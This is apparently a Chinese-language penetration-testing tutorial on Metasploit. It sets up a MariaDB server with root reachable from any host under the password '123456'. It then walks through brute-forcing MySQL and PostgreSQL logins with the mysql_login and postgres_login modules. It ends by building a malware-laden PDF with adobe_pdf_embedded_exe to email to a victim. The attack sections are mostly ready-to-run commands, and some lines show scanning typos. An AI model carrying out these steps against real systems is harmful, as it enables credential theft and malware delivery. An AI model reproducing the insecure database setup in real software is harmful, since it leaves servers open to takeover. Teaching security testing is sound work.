#### 渗透攻击 MySQL数据库服务
- MySQL 是一个关系型数据库管理系统。在web 服务器应用方面，MySQL数据库通常是用户的最优选择。如果管理员配置不当，就可能存在漏洞，如弱密码、用户权限配置
错误等。此时，渗透测试者可以尝试对其实施渗透测试。在 MSF 控制终端，提供了一个辅助模块 mysql_login，可以用来实施弱密码破解。

```c
//搭建mariadb数据库
//1.安装mariadb
yum install mariadb*
//2.启动mariadb
systemctl start mariadb
//3.初始化mariadb配置
mysql_secure_installation
//4.开启mariadb远程访问
//1)进入数据库
mysql -u root -p
//2)进入mysql数据库
use mysql
//3)开启root用户远程用户登录权限
grant all on *.* to root@'%' identified by '123456' with grant option;
//*.*,表示可以访问任意数据的任意表
//'root'@'%', root表示远端登录使用的用户名,%表示允许任意ip登录,可将指定ip替换掉%, root与%可以自定义
//IDENTIFIED BY '123456' 这个123456是登录时的使用的密码
//4)刷新配置
flush privileges;
//5)使用以下命令查看远程用户是否添加
select host,user,password,from mysql.user;
//6)修改配置文件
//在 /etc/my.cnf.d 目录下的 mariadb-server.cnf 文件中,将bind-address设置为0.0.0.0，或者将其注释
//5.重启mariadb程序
systemctl restart mariadb
//6.远程登录命令
mysql -u root -h 192.168.10.1 -p

//使用mysql_login模块，渗透攻击 MySQL 数据库服务
//使用mysql_login 模块
msf5 > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary (scanner/mysq1/mysql login) >

//查看模块配置选项
msf5 auxiliary (scanner/mysql/mysql_login) > show options

//配置模块选项参数
//设置目标主机地址
msf5 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.29.137
RHOSTS => 192.168.29.137
//设置用户文件
msf5 auxiliary (scanner/mysql/mysql login) > set USER FILE /root/users.txt
USER FILE => /root/users. txt
//设置密码文件
msf5 auxiliary(scanner/mysql/mysql login) > set USERPASS FILE /root/passwords. txt
USERPASS FILE => /root/passwords.txt

//实施渗透测试
msf5 auxiliary (scanner/mysql/mysql login) > exploit
```


#### 渗透攻击 PostgreSQL 数据库服务
- PostgerSQL 是一个自由的对象--关系数据库服务（数据库管理系统）。在某些情况下，用户也可以使用该数据库服务来存储数据，如 Metasploit。下面将介绍使用postgrs_login模块，对PostgreSQL数据库服务实施渗透测试
```c
//使用 postgres_login 模块，实施渗透攻击PostgreSQL数据库服务。
//选择postgres_login 模块
msf5 > use auxiliary/scanner/postgres/postgres login
msf5 auxiliary (scanner/postgres/postgres login >

//配置 RHOSTS 选项参数
msf5 auxiliary (scanner/postgres/postgres_ login) > set RHOSTS 192.168.29.137
RHOSTS =>192.168.29.137

//实施渗透测试
msf5 auxiliary(scanner/postgres/postgres login) > exploit
```

#### PDF 文件攻击
- PDF 是一种文件格式。该类型文件使用比较广泛，并且容易传输。在前面介绍的渗透测试方法，都是主动实施渗透测试。如果目标主机没有监听服务器类端口时，则需要使用被动渗透测试方式。此时，可以尝试向客户端发送一个带病毒的PDF文件，进而实施被动攻击。下面将介绍创建带病毒的 PDF文件，以实现被动滲透测试攻击
```c
//使用 Adobe PDF Embedded EXE 模块，创建 PDF 病毒文件
//使用adobe_pdf_embedded_exe 模块
msf> use exploit/windows/fileformat/adobe pdf embedded exe
msf5 exploit (windows/fileformat/adobe pdf embedded exe) >

//设置用户想要生成的 PDF 文件名
msf exploit (adobe pdf embedded exe) > set FILENAME test.pdf
FILENAME => test.pdf

//没置 INFILENAME选项。为了利用该PDF文件，使用该选项指定用户访问的PDF文件位置。如果用户没有一个合适的PDF攻击文件，也可以使用默认的模板文件template.pdf,则无须配置该选项
msf exploit (adobe pdf embedded exe) > set INFILENAME /root/evil.pdf
INFIIENAME => /root/evi1.pdf
//这里指定的PDF 文件中不能包含关键宇 Root。 否则，无法生成对应的带病毒PDF 文件。

//生成 PDF 病毒文件
msf exploit (adobe pdf embedded exe) > exploit
/*
输出的信息显示 test.pdf 文件己经生成，而且被保存到/usr/share/metasploit-framework/local 目录中。接下
来用户可以将创建好的 PDF 文件通过邮件或其他方式发送到目标主机，然后在本地建立监听。当目标主机用户打开该 PDF 文件时，将可能被攻击。
*/
